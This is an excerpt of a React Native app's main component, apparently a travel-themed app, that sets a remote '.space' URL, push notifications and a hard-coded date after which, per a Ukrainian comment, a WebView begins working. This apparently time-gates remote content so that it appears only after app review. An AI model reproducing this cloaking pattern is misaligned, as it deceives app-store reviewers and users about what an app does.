...
import LucernetoValaisProdScr from './Components/LucernetoValaisProdScr';
...
const App = () => {
  ...
  const INITIAL_URL = `https://divine-celebrated-exuberance.space/`;
  const URL_IDENTIFAIRE = `o57K1GIf`;
  ...
  OneSignal.initialize('46b703c9-6360-4269-b595-7fad7fd46579');
  ...
  useEffect(() => {
    ...
    const targetData = new Date('2025-06-02T13:00:00'); //дата з якої поч працювати webView
      ...
      return (
        <Stack.Navigator>
          <Stack.Screen
            ...
            name="LucernetoValaisProdScr"
            component={LucernetoValaisProdScr}
      ...
      <NavigationContainer>
        {!louderPrevIsEnded || !aceptTransperency || !completeLink ? (
          <ImageBackground
            ...
            <Animated.View
              style={[styles.loaderContainer, {opacity: appearingAnim}]}>
              <Animated.Text
                style={[styles.loaderText, {opacity: appearingAnim}]}>
                Welcome
              </Animated.Text>
